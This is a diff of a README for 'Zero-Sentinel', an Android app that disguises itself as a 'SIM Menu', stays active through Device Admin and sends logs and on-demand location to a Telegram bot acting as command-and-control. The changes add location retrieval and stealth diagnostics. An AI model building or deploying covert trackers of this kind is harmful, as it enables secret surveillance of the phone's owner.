@@ -25,8 +25,8 @@ Unlike other solutions that depend on cloud storage, Zero-Sentinel operates inde
 | :--- | :--- |
 | **🎭 Stealth Decoy** | Disguises as "SIM Menu". Access native UI via secret PIN. |
 | **🛡️ Resilience** | Uses WorkManager & Device Admin to stay active in the background. |
-| **⚡ Real-time C2** | Polls commands every 10s when app is open for instant testing. |
-| **📊 Diagnostics** | Remote hardware health checks (Battery, Temp, Storage). |
+| **📍 On-Demand Location** | Passive location retrieval via `/fetch_loc`, saving battery. |
+| **📊 Diagnostics** | Remote stealth health checks (Battery, Network, Temp, Storage, Ringer). |
 | **🧹 Data Hygiene** | Secure wipe of logs after successful upload. |
 | **🤖 Serverless** | Leverages Telegram as C2, zero VPS cost. |
 | **🔒 Secure Access** | Remote PIN management & local AES-256 encryption. |
@@ -56,12 +56,12 @@ graph TD
 *   **Security Core**: `EncryptedSharedPreferences` (AES-256) & `SentinelDeviceAdminReceiver`.
 
 ### Commands (C2)
-Control the agent via Telegram Bot:
-*   `/ping`: Dynamic heartbeat status and next cycle estimate.
-*   `/hwinfo`: Real-time hardware diagnostics (Battery, Storage, Uptime).
-*   `/getlogs`: Immediate upload of current log database as `.md` file.
-*   `/wipe`: Force delete all local logs & database records on device.
-*   `/setpin <6-digit PIN>`: Remotely change app access PIN.
+Control the agent via Telegram Bot UI (click-to-execute):
+*   `/stat`: Dynamic heartbeat status, remote hardware diagnostics (Battery, Wi-Fi/Cellular, Sound Profile), and next cycle estimate.
+*   `/fetch_loc`: Queues an on-demand location retrieval for the next cycle.
+*   `/fetch_logs`: Immediate upload of current log database as a CSV/Markdown file.
+*   `/fetch_all`: Queues location retrieval and uploads logs simultaneously.
+*   `/config_<wipe|pin|exc_*>`: Dedicated subcommands for managing configurations like wiping data locally, changing app PIN, or setting notification exceptions.
 
 ---
 
@@ -69,9 +69,9 @@ Control the agent via Telegram Bot:
 
 1.  **Download**: Get the latest APK from [Releases](https://github.com/arinadi/CyperBot/releases).
 2.  **Open "SIM Menu"**: Click **"Help and Support"** and enter default PIN `123123`.
-3.  **Onboarding**: Grant requested permissions (Notification Access, Battery Opts, Device Admin).
-4.  **Configure**: Enter your Telegram Bot Token & Chat ID.
-5.  **Secure**: Immediately change the default PIN via settings menu.
+3.  **Configure**: Enter your Telegram Bot Token & Chat ID.
+4.  **Onboarding Gateway**: Tap the **"Test"** button. This acts as a unified setup gateway to sequentially request all required permissions (Notification Access, Battery Opts, Device Admin, Location) and performs a real-time data sync with your Telegram bot.
+5.  **Secure**: Immediately change the default PIN via settings menu or `/config_pin` command.
 
 ---
 
